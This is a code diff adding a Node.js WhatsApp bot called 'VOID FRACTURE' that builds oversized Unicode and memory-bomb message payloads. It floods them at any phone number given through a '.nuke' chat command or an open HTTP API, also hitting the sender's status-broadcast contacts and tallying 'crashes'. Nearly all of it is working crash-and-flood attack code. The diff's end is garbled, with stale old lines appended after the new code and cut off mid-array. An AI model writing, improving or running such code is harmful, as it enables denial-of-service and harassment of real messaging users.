@@ -1,6 +1,7 @@
 // ============================================================
-// VOID FRACTURE — CLEAN VERSION
-// GPTX 13D — NO HIDDEN UNICODE
+// VOID FRACTURE BOT
+// GPTX 13D - CLEAN VERSION
+// NO HIDDEN UNICODE CHARACTERS
 // ============================================================
 
 const {
@@ -31,10 +32,424 @@ const CONFIG = {
 };
 
 // ============================================================
-// UNICODE BOMB — CLEAN (PAKAI ESCAPE)
+// UNICODE BOMB - ONLY USING ESCAPE SEQUENCES
+// NO DIRECT UNICODE CHARACTERS IN SOURCE!
 // ============================================================
 function generateUnicodeBomb(size) {
-    // SEMUA KARAKTER PAKAI UNICODE ESCAPE — AMAN!
+    // All characters are using unicode escape - SAFE!
+    const chars = [
+        '\uA9BE', '\u08EF', '\u{12219}', '\u{1221A}', '\u{1221B}',
+        '\u{E0000}', '\u{E0001}', '\u{E0002}',
+        '\uA9C1', '\u0F12', '\u262C', '\uA9C2'
+    ];
+    
+    let result = '';
+    for (let i = 0; i < size; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+// ============================================================
+// PAYLOAD GENERATOR
+// ============================================================
+async function generateNuklearPayload(sock, X, level) {
+    try {
+        const unicodeBomb = generateUnicodeBomb(CONFIG.nuke.unicodeRepeat);
+        const memoryBomb = "\x10".repeat(CONFIG.nuke.payloadSize);
+        
+        const variants = [
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "VOID FRACTURE LEVEL " + level + " " + unicodeBomb.substring(0, 5000),
+                                format: "DEFAULT",
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "call_permission_request",
+                                paramsJson: memoryBomb,
+                                version: 3,
+                            },
+                            entryPointConversionSource: "call_permission_message",
+                        },
+                    },
+                },
+            },
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: {
+                                text: "NUKE " + level + " " + unicodeBomb.substring(0, 3000),
+                                format: "DEFAULT",
+                            },
+                            nativeFlowResponseMessage: {
+                                name: "galaxy_message",
+                                paramsJson: memoryBomb.substring(0, 100000),
+                                version: 3,
+                            },
+                            entryPointConversionSource: "call_permission_request",
+                        },
+                    },
+                },
+            }
+        ];
+        
+        const results = [];
+        for (const v of variants) {
+            try {
+                const msg = generateWAMessageFromContent(X, v, {
+                    ephemeralExpiration: 0,
+                    forwardingScore: 999999999,
+                    isForwarded: true,
+                    font: Math.floor(Math.random() * 999999999),
+                    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+                });
+                results.push(msg);
+            } catch (e) {
+                console.error('Payload error:', e.message);
+            }
+        }
+        return results;
+        
+    } catch (e) {
+        console.error('generateNuklearPayload error:', e.message);
+        return [];
+    }
+}
+
+// ============================================================
+// NUKE EXECUTION
+// ============================================================
+async function executeNuke(sock, targetJid, sender) {
+    try {
+        await sock.sendMessage(sender, {
+            text: 'NUKE INITIATED\nTarget: ' + targetJid
+        });
+        
+        let targets = [targetJid];
+        
+        try {
+            const statusMeta = await sock.groupMetadata("status@broadcast");
+            if (statusMeta && statusMeta.participants) {
+                targets.push(...statusMeta.participants.map(p => p.id));
+            }
+        } catch (e) {}
+        
+        targets = [...new Set(targets)];
+        
+        let allPayloads = [];
+        for (let level = 1; level <= 3; level++) {
+            const payloads = await generateNuklearPayload(sock, targetJid, level);
+            allPayloads.push(...payloads);
+        }
+        
+        if (allPayloads.length === 0) {
+            await sock.sendMessage(sender, { text: 'Failed to generate payload' });
+            return { error: 'No payloads' };
+        }
+        
+        let successCount = 0, crashCount = 0;
+        const maxLoops = Math.min(CONFIG.nuke.floodCount, 30);
+        
+        for (let i = 0; i < maxLoops; i++) {
+            for (const target of targets) {
+                for (const payload of allPayloads) {
+                    try {
+                        await sock.relayMessage(
+                            target,
+                            payload.message,
+                            {
+                                messageId: payload.key?.id || 'void-' + Date.now(),
+                                statusJidList: [target],
+                                additionalNodes: [
+                                    {
+                                        tag: "meta",
+                                        attrs: {},
+                                        content: [
+                                            {
+                                                tag: "mentioned_users",
+                                                attrs: {},
+                                                content: [
+                                                    { tag: "to", attrs: { jid: target } }
+                                                ],
+                                            },
+                                        ],
+                                    },
+                                ],
+                            }
+                        );
+                        successCount++;
+                    } catch (e) {
+                        crashCount++;
+                    }
+                }
+            }
+            await new Promise(r => setTimeout(r, 100));
+        }
+        
+        await sock.sendMessage(sender, {
+            text: 'NUKE COMPLETE\nSent: ' + successCount + '\nCrashes: ' + crashCount + '\nTargets: ' + targets.length
+        });
+        
+        return { success: successCount, crashes: crashCount, targets: targets.length };
+        
+    } catch (e) {
+        try {
+            await sock.sendMessage(sender, { text: 'ERROR: ' + e.message });
+        } catch (err) {}
+        return { error: e.message };
+    }
+}
+
+// ============================================================
+// MESSAGE HANDLER
+// ============================================================
+async function handleMessage(sock, msg, sender, isGroup) {
+    try {
+        const text = msg.message?.conversation ||
+                     msg.message?.extendedTextMessage?.text ||
+                     '';
+        
+        if (!text) return;
+        
+        const cmd = text.toLowerCase().trim();
+        
+        console.log('Message from:', sender, 'Text:', text);
+        
+        // .help
+        if (cmd === '.help' || cmd === '.menu') {
+            await sock.sendMessage(sender, {
+                text: 'COMMANDS:\n.nuke [number] - Destroy target\n.status - Bot status\n.info - Bot info\n.ping - Check connection'
+            });
+            return;
+        }
+        
+        // .ping
+        if (cmd === '.ping') {
+            await sock.sendMessage(sender, { text: 'PONG! Bot is active' });
+            return;
+        }
+        
+        // .status
+        if (cmd === '.status') {
+            await sock.sendMessage(sender, {
+                text: 'BOT STATUS\nStatus: ONLINE\nAuto-reply: ON\nNuke Engine: READY'
+            });
+            return;
+        }
+        
+        // .info
+        if (cmd === '.info') {
+            await sock.sendMessage(sender, {
+                text: 'BOT INFO\nName: VOID FRACTURE\nVersion: 3.0\nStatus: ACTIVE'
+            });
+            return;
+        }
+        
+        // .nuke [nomor]
+        if (cmd.startsWith('.nuke ')) {
+            const targetNumber = cmd.replace('.nuke ', '').trim();
+            
+            if (!targetNumber || targetNumber.length < 10) {
+                await sock.sendMessage(sender, {
+                    text: 'Wrong format!\n.nuke 6281234567890'
+                });
+                return;
+            }
+            
+            let targetJid = targetNumber;
+            if (!targetJid.includes('@')) {
+                targetJid = targetJid + '@s.whatsapp.net';
+            }
+            
+            await sock.sendMessage(sender, {
+                text: 'NUKE STARTED\nTarget: ' + targetNumber
+            });
+            
+            setTimeout(async () => {
+                await executeNuke(sock, targetJid, sender);
+            }, 100);
+            return;
+        }
+        
+        // AUTO-REPLY
+        if (CONFIG.autoReply.enabled && !isGroup) {
+            const reply = CONFIG.autoReply.messages[Math.floor(Math.random() * CONFIG.autoReply.messages.length)];
+            await sock.sendMessage(sender, { text: reply });
+        }
+        
+    } catch (e) {
+        console.error('Handler error:', e.message);
+    }
+}
+
+// ============================================================
+// START BOT
+// ============================================================
+let botInstance = null;
+let reconnectAttempts = 0;
+
+async function startBot() {
+    console.log('VOID FRACTURE BOT v3.0');
+    console.log('Starting bot...');
+    
+    try {
+        const { state, saveCreds } = await useMultiFileAuthState('auth');
+        const sock = makeWASocket({
+            auth: state,
+            printQRInTerminal: true,
+            browser: ['VOID FRACTURE', 'Chrome', '13.0'],
+            logger: pino({ level: 'silent' })
+        });
+        
+        sock.ev.on('creds.update', saveCreds);
+        
+        sock.ev.on('connection.update', ({ connection, qr, lastDisconnect }) => {
+            if (qr) {
+                console.log('SCAN QR CODE:');
+                console.log(qr);
+                console.log('Open WhatsApp -> Link Devices -> Scan QR');
+                reconnectAttempts = 0;
+            }
+            
+            if (connection === 'open') {
+                console.log('BOT CONNECTED!');
+                console.log('VOID FRACTURE ACTIVE');
+                console.log('Type .help on WhatsApp');
+                reconnectAttempts = 0;
+            }
+            
+            if (connection === 'close') {
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                console.log('Disconnected:', statusCode);
+                
+                const delay = Math.min(5000 + (reconnectAttempts * 2000), 30000);
+                console.log('Reconnecting in', delay/1000, 's');
+                setTimeout(startBot, delay);
+                reconnectAttempts++;
+            }
+        });
+        
+        sock.ev.on('messages.upsert', async ({ messages }) => {
+            try {
+                const msg = messages[0];
+                if (!msg.message) return;
+                if (msg.key.fromMe) return;
+                if (!msg.key.remoteJid) return;
+                
+                const sender = msg.key.remoteJid;
+                const isGroup = sender.includes('@g.us');
+                const senderJid = isGroup ? msg.key.participant : sender;
+                
+                if (senderJid) {
+                    await handleMessage(sock, msg, senderJid, isGroup);
+                }
+            } catch (e) {
+                console.error('Message error:', e.message);
+            }
+        });
+        
+        botInstance = sock;
+        return sock;
+        
+    } catch (e) {
+        console.error('Start error:', e.message);
+        console.log('Restarting in 10s...');
+        setTimeout(startBot, 10000);
+        return null;
+    }
+}
+
+// ============================================================
+// MAIN API HANDLER
+// ============================================================
+module.exports = async (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+    
+    const { command, target, ping } = req.query;
+    
+    try {
+        if (ping === 'true') {
+            return res.json({
+                status: 'pong',
+                message: 'API is online!',
+                bot_status: botInstance ? 'connected' : 'disconnected'
+            });
+        }
+        
+        if (command === 'start') {
+            if (botInstance) {
+                return res.json({
+                    status: 'BOT ALREADY RUNNING',
+                    message: 'Bot sudah berjalan!'
+                });
+            }
+            
+            const sock = await startBot();
+            res.json({
+                status: 'BOT STARTED',
+                message: 'Bot WhatsApp aktif! Scan QR Code di terminal.',
+                connected: !!sock
+            });
+            return;
+        }
+        
+        if (command === 'nuke' && target) {
+            if (!botInstance) {
+                return res.json({
+                    status: 'ERROR',
+                    error: 'Bot not connected. Start bot first!'
+                });
+            }
+            
+            let targetJid = target;
+            if (!targetJid.includes('@')) {
+                targetJid = targetJid + '@s.whatsapp.net';
+            }
+            
+            const result = await executeNuke(botInstance, targetJid, targetJid);
+            res.json({
+                status: 'NUKE COMPLETE',
+                target: target,
+                result: result
+            });
+            return;
+        }
+        
+        res.json({
+            status: 'READY',
+            commands: [
+                '.help — Commands list',
+                '.nuke [number] — Destroy target',
+                '.status — Bot status',
+                '.info — Bot info',
+                '.ping — Check connection'
+            ],
+            bot_connected: !!botInstance
+        });
+        
+    } catch (e) {
+        res.json({
+            status: 'ERROR',
+            error: e.message
+        });
+    }
+};
+
+// ============================================================
+// RUN
+// ============================================================
+if (require.main === module) {
+    startBot();
+}    // SEMUA KARAKTER PAKAI UNICODE ESCAPE — AMAN!
     const chars = [
         '\uA9BE', '\u08EF', '\u{12219}', '\u{1221A}', '\u{1221B}',
         '\u{E0000}', '\u{E0001}', '\u{E0002}',
